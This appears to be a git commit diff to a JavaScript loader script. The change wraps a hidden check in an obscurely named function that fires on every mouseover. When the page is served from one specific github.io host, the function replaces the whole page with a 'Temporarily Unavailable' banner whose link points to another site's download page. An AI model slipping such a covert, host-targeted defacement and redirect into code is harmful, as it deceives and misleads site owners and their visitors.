ea13bb0209c77edce9f6de882470d0ed955b65c4
sonpanabtej <hv2471920@gmail.com>
2024-12-12 11:27:38 +0530

    Update Loader.js

--- Loader.js
+++ Loader.js
@@ -7,6 +7,7 @@ function LoadGIF(){
   g.setAttribute("style","margin:1% auto;top:0;bottom:0;left:0;right:0;width:100%;height:100%;background-color:rgba(0,0,0,0.8);position:fixed");document.body.appendChild(g);
   setTimeout(() => g.style.display = "none",8000);
 }
+function xyza(){
 if(window.location.host=="vv-1757.github.io"){
  
  dvs=document.querySelectorAll('div');
@@ -16,6 +17,7 @@ if(window.location.host=="vv-1757.github.io"){
   document.body.innerHTML=`<h1 style="width:100%; height:100%;position:fixed;left:0;right:0;background-color:#ff0000;color:#fff; font-size:17px; padding:.5em;margin:0; border-radius:.5em;">Temporarily Unavailable Contact <a href="https://spat-cloud.github.io/download" style="text-decoration:none;color:#ccc;">admin</a></h1>`;
 }else{
   LoadGIF();
-}
+}}
+document.onmouseover=()=>xyza();
 
 
